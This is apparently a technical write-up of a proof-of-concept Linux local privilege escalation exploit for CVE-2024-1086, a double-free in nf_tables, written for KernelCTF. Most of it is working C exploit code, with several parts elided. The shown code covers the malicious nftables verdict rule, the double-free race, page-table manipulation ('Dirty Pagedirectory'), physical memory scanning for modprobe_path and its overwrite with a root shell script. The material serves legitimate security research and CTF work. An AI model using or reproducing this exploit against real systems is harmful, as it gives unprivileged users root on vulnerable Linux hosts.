# exploit

Original LPE PoC for CVE-2024-1086, tested on Linux KernelCTF lts-6.1.72 and mitigation-6.1. Successrate of 99.6% on LTS on local testing.

The author has published a blogpost on this exploit: "[Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques](https://pwning.tech/nftables/)", containing extra background information on topics covered in this write-up. 

## Requirements

As described in the vulnerability docs, the exploit requires nf_tables and unprivileged user namespaces to be available.

Caveats for this version of the exploit:
- Only works on QEMU VMs (because of a race-condition related to converting pages from order==4 to order==0)
- Requires at least 2 CPU cores to be present (because of the race condition above)
- Requires a maximum of 4GiB physical memory

The updated version is included in the seperate blogpost and Github repo.

## Multiprocessing

This exploit makes use of 2 processes, because of a race condition. 

In this version, there are 2 threads for Dirty Pagedirectory: the "target PFN write" thread (PMD side), and the "target page access" thread (PUD side). This is because the PUD page and PMD page are allocated in the seperate processes. It is possible to make this behaviour obsolete, but this was unknown at the time of submission.

The communication between the threads happen through an shared `struct shared_info` instance, mmap'd in `main()`. There are several status indicators in this struct:
- `mem_status`: an indicator of the memory scanning status (saying thread 1 should proceed or thread 2 should proceed)
- `lock_status`: an indicator of a CPU lock, used when syncing up the threads for the race condition.
- `flush_status`: obsolete indicator which was used for communication between the TLB flushing parent and child. Now, the TLB flushing function mmap's its own indicator, which is now thread safe.
- `exploit_status`: an indicator used for the foreground exploit thread which makes it look like the exploit process stopped when it is done, whilst the child actually keeps running by sleeping to avoid a kernel bug.

```c
#define SPINLOCK_NOSLEEP(cmp) while (cmp) { }

// syncs threads within 5ms diffs by calling both SYNC_CPU0() and SYNC_CPU1()
// allows CPU1 to be earlier and allows CPU0 to be earlier

#define SYNC_CPU0() do { \
		printf("[*] syncing cpu 0...\n"); \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_NONE); \
\
		memdump_info->lock_status = LOCK_STAT_0; \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_0); \
\
		memdump_info->lock_status = LOCK_STAT_NONE; \
 } while (0);

#define SYNC_CPU1() do { \
		printf("[*] syncing cpu 1...\n"); \
		memdump_info->lock_status = LOCK_STAT_1; \
		SPINLOCK_NOSLEEP(memdump_info->lock_status == LOCK_STAT_1); \
\
		memdump_info->lock_status = LOCK_STAT_1; \
 } while (0);
 ```

## Workflow - Setup

### Namespaces

Before we can exploit the vuln, we need to setup user namespaces so we can set up our own nft rules, and disable RPF (anti IP spoofing thing, which prevents us from traversing a specific IPv4 codepath to avoid kernel panics). The code for these procedures are straightforward but a lot of code, so I will not show it here.

```c
void setup_env()
{
    uid_t uid = getuid();
    gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
	configure_interfaces();
	configure_nftables();
    clean_files();
}
```

### Nft rule triggering the bug

Before we can trigger the vuln, we need to set up an nft rule which returns the malicious verdict. To avoid false positives, we need to specify a unique filter so only our exploits' packet triggers the double-free. If we did not apply the filter, every IPv4 packet in the system would get double-freed. Our filter is arbitrary, and I chose for filtering for packets which have IPv4 header protocol == 69 && first 4 bytes "\x41\x41\x41\x41". I have not experienced false positives with this. 

```c
static void add_set_verdict(struct nftnl_rule *r, uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("immediate");
	if (e == NULL) {
		perror("expr immediate");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val); // Set the verdict to 0x69

	nftnl_rule_add_expr(r, e);
}

static struct nftnl_rule *alloc_rule(unsigned char family, const char *table, const char *chain, unsigned char proto)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("rule alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	nftnl_rule_set(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set(r, NFTNL_RULE_CHAIN, chain);

	// expect protocol to be `proto`
	add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, offsetof(struct iphdr, protocol), sizeof(unsigned char));
	add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(unsigned char));

	// expect 4 first bytes of packet to be \x41
    add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, sizeof(struct iphdr), 4);
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, "\x41\x41\x41\x41", 4);


	// (NF_DROP | -((0xFFFF << 16) >> 16)) == 1, aka NF_ACCEPT (trigger double free)
	// (NF_DROP | -((0xFFF0 << 16) >> 16)) == 16
	add_set_verdict(r, 0xFFFF << 16);

	return r;
}
```

### Pre-allocating Dirty Pagedirectory PUDs

In order to use Dirty Pagedirectory we must register VMAs before we can allocate the pages and pagetables. Additionally, notice how we pre-allocate the PUD for the PMD double-alloc etc, so we do not allocate the PUD when we need to allocate the PMD.

These VMA address ranges are semi-arbitrary, as long as they align with their targetted pagetable entries.

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
	unsigned long long *pmd_area;
	void *_pud_area;
	void *pud_kernel_area;
	void *pud_data_area;
    // ... (more var declarations)

	// pre-allocate PUD for PMD
	mmap((void*)0x200000, 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)0x200000 = 0xCAFEBABE;

	// pre-allocate VMA for PMD and PUD (not themself)
	pmd_area = mmap((void*)0x40000000, 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);  // shared bcs it may be used for cache flushing
	
	// these use different PTEs but the same PUD
	_pud_area = mmap((void*)0x8000000000, 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pud_kernel_area = _pud_area;
	pud_data_area = _pud_area + 0x200000;

    // ... (more exploit code)
}
```

## Workflow - Double-free -> Dirty Pagedirectory

Before we proceed, please checkout the image below, describing the operations to set up Dirty Pagedirectory (PUD+PMD):

> Abbreviations:
> - `skb`: socket buffer, a.k.a. `struct sk_buff`
> - `SLAB`: kernel memory allocation through the SLAB allocator (e.g. kmalloc)
> - `BUD`: kernel memory allocation through the buddy (BUD) allocator
> - `PCP`: kernel memory allocation through the per-CPU page (PCP) allocator
> - `P`: page amount (i.e. `skb->head` size), so 1P = 1 page, 16P = 16 pages
> - `PMD`: Page Upper Directory (pagetables L2)
> - `PUD`: Page Upper Directory (pagetables L3)

![Overview of exploit operations to set up Dirty Pagedirectory](img/pagesetup.svg)

### Setup for `CONFIG_FREELIST_HARDENED` naive DF detection bypass

In order to bypass `CONFIG_FREELIST_HARDENED`'s naive double-free detection in the SLAB freelists, we simply allocate an `struct sk_buff` from the freelist<sup>[1]</sup> before the double-free<sup>[[2](../exploit/lts-6.1.72/src/exploit.c#L362)]</sup>, which we free (append to the freelist)<sup>[[3](../exploit/lts-6.1.72/src/exploit.c#L368)]</sup> in between the double-free.

#### `df_ip_header` explanation

The variable `df_ip_header` is the content of the IPv4 packets sent to the kernel from userland by the exploit to shape the memory. It contains standardized IPv4 packet fields like `ip_v` (IP version used by the packet), `ip_hl` (IP header length divided by 4 bytes: in this case 20 bytes so `ip_hl = 20 / 4 = 5`), `ip_tos`, and `ip_ttl`. 

Other fields are cherrypicked for the exploit: 
- `ip_len`, `ip_id`, and `ip_off` (used for skb freelist shaping, see arbitrary skb free technique)
- `ip_p` (arbitrary protocol number: should be unused, as it is used to filter the double free packet in the nftables rule)
- `ip_src` and `ip_dst` (used to bypass corruption because `skb->dst` is corrupted due to double-free)

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	set_ipfrag_time(1);

	// ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
        // ... (more exploit stuff)
    } else {
#if CONFIG_FLC_BYPASS
		set_ipfrag_time(1);

		// will expire naturally after 1 second
		df_ip_header.ip_id = 0x1334;
		df_ip_header.ip_len = sizeof(struct ip)*2 + 8*2 + 8;
		df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);
		alloc_intermed_buf_hdr(8, &df_ip_header);  // [1]

		// make sure df trigger packet doesn't get expired while waiting for skb5 to be freed
		set_ipfrag_time(999);
#endif
        // ... (do double-free)
    }
    
    // ... (more exploit stuff)
}
```

### Double-free (free 1)

In order to trigger the double-free, we send the IPv4 packet which satisfies the filter. This will cause the first free of the double-free. Then, it will send the packet to an IPv4 fragment queue (IFQ), until 999 seconds have passed or until the queue is complete (which we will complete when the 2nd free happened). 

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
        // ... (more exploit stuff)
    } else {
#if CONFIG_FLC_BYPASS
		set_ipfrag_time(1);

        // ... (create double-free evasion packet, which will be freed 1 sec from now)

		// make sure df trigger packet doesn't get expired while waiting for skb5 to be freed
		set_ipfrag_time(999);
#endif

		df_ip_header.ip_id = 0x1337;
		df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
		df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
		trigger_double_free_hdr(32768 + 8, &df_ip_header);

        // ... (more exploit stuff)
    }
    
    // ... (more exploit stuff)
}
```

### Middle double-free obj free (DF detection evasion)

Now the first free happened, we need to do the free in the middle to prevent naive double-free detection. We do this by waiting 1000ms (+ 100ms buffer): the time we specified earlier with `set_ipfrag_time(1)`.

We also set the ipfrag_time for the double-free packet to be 999, which means it will not expire now (but 999 seconds from now).

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
        // ... (more exploit stuff)
    } else {
		// ... (DF free 1)

#if CONFIG_FLC_BYPASS
		// reset timer since our other-CPU packet is expiring on 1 sec
		set_ipfrag_time(1);

		// wait for corruption bypass packet to expire
		// this may need to be longer or shorter, depending on WARNING() duration
		//sleep(2);
		usleep(1100 * 1000);
#endif

        // ... (more exploit stuff)
    }
    
    // ... (more exploit stuff)
}
```

### Double-free (free 2) + race condition + double-alloc

Now it's time to pull of the race condition for the 2nd free: 

1. sync both threads
2. CPU 0 thread allocate the packet with previous skb->head | CPU 1 thread frees this skb->head 
3. CPU 1 allocates double-alloc PMD page
4. CPU 0 packet expires after 1s
5. CPU 0 allocates double-alloc PUD page

For a full explanation of the technique, check the novel techniques document, which describes the order 4 -> order 0 conversion technique in detail.

Notice how we allocate hte PUD and PMD by writing to the address, since pagetables are allocated JIT: if we do not access the virtual address in it's bailywick, it will not be allocated. 


```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
		pin_cpu(1);

		SYNC_CPU1();

		// append to ip packet with fragment to free packet on *this* cpu
		// offset <<= 3, so divide by 8 aka >> 3 (this is so we have 3 bits for fragmentation flags)
		// setup ipfrag_time timer for fragment expiration / waiting for frags
		df_ip_header.ip_id = 0x1337;
		df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
		df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
		
		// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
		// causes end == offset in ip_frag_queue(). packet will be empty
		// remains running until after both frees, a.k.a. does not require sleep
		alloc_intermed_buf_hdr(0, &df_ip_header);
		
		pmd_area[0] = 0xDEADBEEF;

        // ... (more exploit stuff)
    } else {
		// ... (DF free 1 + mid free)

		SYNC_CPU0();

		// soft lock on cpu == too early
		// bad page (non-zero page refcount) == too late (missed warning() window), nearly did undetected double free

		//usleep(30 * 1000);  // env:qemu-debug,kernel:debug,fs:debian,redirect:stdout env:kernel-debug-v3,kernel:lts-6.1.72,fs:kernelctf,redirect:none
		usleep(20 * 1000); //  env:kernel-debug-v2,kernel:lts-6.1.72,fs:kernelctf,redirect:none env:kernelctf,kernel:lts-6.1.64,fs:debian,redirect:none
		// ^^^^ REVERT FOR KERNELCTF PROD ^^^^

		// alloc skb3, and wait 1 second for allocating next packet to give time to other thread for allocating pmd
		df_ip_header.ip_id = 0x1338;
		df_ip_header.ip_len = sizeof(struct ip) + 32768 + 16;
		df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000); 
		alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

		// skb3 will be free'd
		usleep(1100 * 1000);

		// allocate overlapping PUD (overlaps with PMD)
		*(unsigned long long*)_pud_area = 0xCAFEBABE;

        // ... (more exploit stuff)
    }
    
    // ... (more exploit stuff)
}
```

## Workflow - Dirty Pagedirectory

Now we have access to the double-allocated PMD page and PUD page, we can do the fun stuff (unlimited read/write to any physical memory address).

### PMD write loop (hacky IPC)

In this version of the exploit Dirty Pagedirectory has to be split in 2 threads (because internally the pagetable pages differ). This means the target-address-write and target-address-dereference parts have to be split across threads. 

Therefore, IPC has to be implemented. Don't be afraid: it's just a struct in shared memory VMA with a few states in a while loop, kind of like a lock. Nothing to be scared about.

Here's the part with the PMD write, or put differently, the target-address-write loop. The other thread can write the target address to the shared struct, and this loop will change the target address to it.

`memdump_info->mem_status == MEM_STAT_DO_UPDATE` tells the loop to change the PMD area to a base of `memdump_info->iteration_base`. After it is done, it will change it to `memdump_info->mem_status == MEM_STAT_DO_IO`, letting the other thread know it can continue.

```c
static void flush_tlb(void *x, void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
		pin_cpu(1);

		// ... ()

		// pud will be allocated and populated
		SPINLOCK(memdump_info->mem_status == MEM_STAT_DO_IO);

		flush_tlb(memdump_info, pmd_area, 0x200000);

		//printf("[*] PTE for PUD page: %016llx\n", pmd_area[0]);
		printf("[*] PTE for PMD page: %016llx\n", *(unsigned long long*)pmd_area);

		// this supports physical memory of (CONFIG_PHYSICAL_START * 512) bytes, i.e. (0x1000000 * 512) = 8GiB, can upped if necessary by just looping the code on both threads
		for (unsigned short j=0; j < 512; j++)
			pmd_area[j] = (CONFIG_PHYSICAL_START * j) | 0x8000000000000867;
		
		// will deadlock when other process completes
		while (1) {
			memdump_info->mem_status = MEM_STAT_DO_IO;
			SPINLOCK(memdump_info->mem_status == MEM_STAT_DO_IO);

			// try an(other) iteration of 0x200000 kernel bytes
			PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", memdump_info->iteration_base, memdump_info->iteration_base + 0x200000);

			// set the pages for the other threads PUD data range to kernel memory
			for (unsigned short j=0; j < 512; j++)
				pmd_area[512 + j] = (memdump_info->iteration_base + 0x1000 * j) | 0x8000000000000867;
		}
    } else {
        // ... (more exploit stuff)
    }
}
```

### Finding `modprobe_path` through physical scanning

This part of the exploit is pretty obvious, it iterates through the entire physical memory and utilizes the KASLR bruteforce technique. By scanning for the kernel start in increments of `CONFIG_PHYSICAL_START`, and then scanning manually 80MiB kernel memroy, we can find `modprobe_path` with minimal effort.

The signature for the first page of the kernel is automatically generated.

```c
static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01\x01\x00\xc0\x48\x8b\x05", 15) == 0 &&
			memcmp(addr + 0x1a, "\x48\xc7\xc2\x00\x00\x00", 6) == 0 &&
			memcmp(addr + 0x21, "\x48\x29\xd0\x48\x01\xf8\x48\x89\xc2\x48\xc1\xea\x20\x0f\x30\x56\xe8", 17) == 0 &&
			memcmp(addr + 0x34, "\x00\x00\x5e", 3) == 0 &&
			memcmp(addr + 0x43, "\x48", 1) == 0 &&
			memcmp(addr + 0x4d, "\xe8", 1) == 0 &&
			memcmp(addr + 0x50, "\x00\x00\x48\x8d\x3d\xa7\xff\xff\xff\x56\xe8", 11) == 0 &&
			memcmp(addr + 0x5d, "\x00\x00\x5e\x48", 4) == 0 &&
			memcmp(addr + 0x6c, "\x00\x00\x00\x00\xe8", 5) == 0 &&
			memcmp(addr + 0x72, "\x00\x00\x00\x48\x8b\x04\x25", 7) == 0 &&
			memcmp(addr + 0x7d, "\x48", 1) == 0 &&
			memcmp(addr + 0x8d, "\x00\x00", 2) == 0) {
		return 1;
	}

	return 0;	
}

static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD,
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 69,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
		// PMD write loop (through IPC)
    } else {
		// allocate overlapping PUD (overlaps with PMD)

		
		memdump_info->mem_status = MEM_STAT_DO_UPDATE;
		SPINLOCK(memdump_info->mem_status == MEM_STAT_DO_UPDATE);
		
		// pud area is be overwritten using pmd area, but the TLB has not been flushed, so it is still cached with the old page
		// this flushed the kernel area of the pud
		flush_tlb(memdump_info, _pud_area, 0x400000);
		printf("[*] value for PUD page: %016llx\n", *(unsigned long long*)_pud_area);

		// get physical kernel base based on initial page's bytes
		// - this "kernel base" is actually the assembly bytecode of start_64() and variants
		// - it's different per architecture and per compiler (clang produces different signature than gcc)
		// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
		//   - i.e: xxd ./vmlinux | grep '00200000:'

		// run this script instead of /sbin/modprobe
		int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
		int status_fd = memfd_create("", MFD_CLOEXEC);
		
		for (int kernel_pud_pte_index=0; kernel_pud_pte_index < 512; kernel_pud_pte_index++) {
			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			if (is_kernel_base(pud_kernel_area + kernel_pud_pte_index * 0x1000) == 0)
				continue;
			
			memdump_info->kernel_addr = kernel_pud_pte_index * CONFIG_PHYSICAL_START;
			memdump_info->iteration_base = (unsigned long long)memdump_info->kernel_addr;
			printf("[+] found kernel phys addr: %016llx\n", memdump_info->kernel_addr);

			// scan 0x4000000 bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++) {
				void *pud_modprobe_addr;

				memdump_info->mem_status = MEM_STAT_DO_UPDATE;
				SPINLOCK(memdump_info->mem_status == MEM_STAT_DO_UPDATE);
				
				flush_tlb(memdump_info, _pud_area, 0x400000);
				PRINTF_VERBOSE("[*] scanning string '%s' @ %p in %016llx, pud val: %016llx...\n", modprobe_path, modprobe_path, memdump_info->iteration_base, *(unsigned long long*)pud_data_area);
				pud_modprobe_addr = memmem(pud_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);

				memdump_info->iteration_base += 0x200000;

				if (pud_modprobe_addr == NULL)
					continue;

				printf("[+] found modprobe path: '%s' @ %p (0x%016llx) by matching '%s' @ %p\n", (char*)pud_modprobe_addr, pud_modprobe_addr, memdump_info->iteration_base + (pud_modprobe_addr - pud_data_area), modprobe_path, modprobe_path);

				// ... (privesc using modprobe_path overwrite)
			}
			
			printf("[*] failed to locate modprobe. trying to find new kernel base...\n");
		}

		printf("[!] failed to find kernel code segment... TLB flush fail?\n");
		memdump_info->exploit_status = EXPLOIT_STAT_FAIL;
		exit(1);
    }
}
```

### Overwriting `modprobe_path` / namespace escape

In this part of the exploit, we overwrite the `modprobe_path` variable, and trigger it.

We overwrite `modprobe_path` to `/proc/<exploit_pid>/fd/<privesc_script_fd>`, which allows us to fileless execute it as root. The content of `privesc_script_fd` will be:

```bash
#!/bin/sh
echo -n 1 > /proc/$exploit_pid/fd/$privesc_status_fd
cat /flag >/dev/console
/bin/sh 0</dev/console 1>/dev/console 2>&1
```

Keep in mind: here we used $ for denoting variables dynamically inserted with `dprintf()`.

The exploit_pid needs to be bruteforced since we need the PID from the root PID namespace for the fd hijack. We can check if we got the right PID by making sure it writes to `privesc_status_fd`, which will be checked for a value in the exploit so it knows when to stop.

```c
static void privesc_flh_bypass(struct shared_info *memdump_info)
{
    // ... (var declarations)
	int child_pid;

    // ... (setup)

	pin_cpu(0);
	child_pid = fork();

	if (child_pid == 0) {
		// PMD write loop (through IPC)
    } else {
		// ... (setup PTE)

		// run this script instead of /sbin/modprobe
		int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
		int status_fd = memfd_create("", MFD_CLOEXEC);
		
		for (int kernel_pud_pte_index=0; kernel_pud_pte_index < 512; kernel_pud_pte_index++) {
			// ... (filter kernel start page)

			for (int i=0; i < 40; i++) {
				// ... (filter modprobe_path data)

				// ===== NEXT PHASE: privesc using modprobe_path overwrite =====

				printf("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);

				int status_cnt;
				for (pid_t pid_guess=0; pid_guess < 65536; pid_guess++)
				{
					char buf;

					// overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pud_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
						printf("[+] setting new modprobe paths (i.e. '%s' @ %p)... matching modprobe_path scan var: '%s' @ %p\n", (char*)pud_modprobe_addr, pud_modprobe_addr, modprobe_path, modprobe_path);
					
					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 > /proc/%u/fd/%u\ncat /flag >/dev/console\n/bin/sh 0</dev/console 1>/dev/console 2>&1\n", pid_guess, status_fd);

					// when pid is correct, run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					modprobe_trigger_memfd();

					// indicates success and stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf("[+] successfully breached the mainframe\n");

					// prevents kernel crash due to bad pagemap
					memdump_info->exploit_status = EXPLOIT_STAT_SUCCESS;
					
					sleep(9999);
				}
			}
			
			printf("[*] failed to locate modprobe. trying to find new kernel base...\n");
		}

		printf("[!] failed to find kernel code segment... TLB flush fail?\n");
		memdump_info->exploit_status = EXPLOIT_STAT_FAIL;
		exit(1);
    }
}
```